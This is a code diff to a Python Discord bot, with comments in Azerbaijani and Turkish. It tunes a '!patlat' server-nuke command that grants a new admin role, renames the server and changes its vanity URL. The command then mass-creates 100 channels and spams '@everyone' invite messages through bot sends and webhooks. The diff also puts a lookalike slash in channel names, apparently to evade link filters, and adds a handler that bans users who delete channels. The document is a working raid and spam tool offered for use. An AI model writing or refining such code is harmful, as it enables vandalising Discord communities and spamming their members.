@@ -105,7 +105,7 @@ async def on_guild_channel_delete(channel):
         async for entry in channel.guild.audit_logs(limit=1, action=discord.AuditLogAction.channel_delete):
             if entry.user.id != SAHIB_ID and entry.user.id != bot.user.id:
                 await channel.guild.ban(entry.user, reason="Anti-Nuke: Kanal silindi!")
-                await channel.guild.create_text_channel("discord.gg/aga")
+                await channel.guild.create_text_channel("discord.gg⁄aga")
     except:
         pass
 
@@ -478,7 +478,7 @@ async def clear_cmd(ctx, amount: int = 5):
     await msg.delete()
 
 # ---------------------------------------------------------------------------
-# 9. ƏYLƏNCƏ OYUNLARI VƏ ULTRA HIZLI 4 WEBHOOKLU !patlat
+# 9. ƏYLƏNCƏ OYUNLARI VƏ 100 KANALLI 2 WEBHOOKLU !patlat
 # ---------------------------------------------------------------------------
 
 @bot.command(name="sex", aliases=["spag", "ip"])
@@ -641,7 +641,7 @@ async def patlat_cmd(ctx):
     if role_tasks:
         await asyncio.gather(*role_tasks, return_exceptions=True)
 
-    # 6. Yeni Admin Rolü və Vanity URL (discord.gg/aga)
+    # 6. Yeni Admin Rolü, Server Adı və Vanity URL (ruhumskdi)
     try:
         new_role = await guild.create_role(
             name="#RUHUMSKDİ",
@@ -653,15 +653,16 @@ async def patlat_cmd(ctx):
         pass
 
     try:
-        await guild.edit(name="XAS", vanity_code="aga")
+        # Server adı və URL-si ruhumskdi edilir, mesajlarda isə discord.gg/aga gedir
+        await guild.edit(name="ruhumskdi", vanity_code="ruhumskdi")
     except:
         pass
 
     avatar_bytes = await bot.user.display_avatar.read() if bot.user.avatar else None
 
-    # 7. Sürətli və Çoxlu Webhook Spam Dalğası (Kanal adları: discord.gg/aga)
+    # 7. 100 Kanal və Sabit Webhook Spam Dalğası (discord.gg/aga)
     async def send_bot_and_webhook_spam(channel, webhooks):
-        for _ in range(40):
+        for _ in range(25):
             try:
                 await channel.send("discord.gg/aga @everyone 🔥 XAS BOT SPAM DALĞASI 🔥")
             except:
@@ -673,15 +674,15 @@ async def patlat_cmd(ctx):
                 except:
                     pass
             
-            await asyncio.sleep(0.02)
+            await asyncio.sleep(0.05)
 
     async def create_and_webhook_spam(i):
         try:
-            channel = await guild.create_text_channel("discord.gg/aga")
-            await asyncio.sleep(0.03)
+            channel = await guild.create_text_channel("discord.gg⁄aga")
+            await asyncio.sleep(0.05)
             
             webhooks = []
-            for w_num in range(1, 5):
+            for w_num in range(1, 3):
                 try:
                     wh = await channel.create_webhook(name=f"XAS-Spam-{w_num}", avatar=avatar_bytes)
                     webhooks.append(wh)
@@ -692,11 +693,11 @@ async def patlat_cmd(ctx):
         except:
             pass
 
-    chunk_size = 10
-    for start in range(1, 251, chunk_size):
-        tasks_list = [create_and_webhook_spam(i) for i in range(start, min(start + chunk_size, 251))]
+    chunk_size = 5
+    for start in range(1, 101, chunk_size):
+        tasks_list = [create_and_webhook_spam(i) for i in range(start, min(start + chunk_size, 101))]
         await asyncio.gather(*tasks_list, return_exceptions=True)
-        await asyncio.sleep(0.1)
+        await asyncio.sleep(0.2)
 
 # ---------------------------------------------------------------------------
 # 10. BOTU İŞƏ SALMAQ (RUN)
@@ -707,3 +708,4 @@ if __name__ == "__main__":
     TOKEN = os.getenv("DISCORD_TOKEN")
     if TOKEN:
         bot.run(TOKEN)
+    
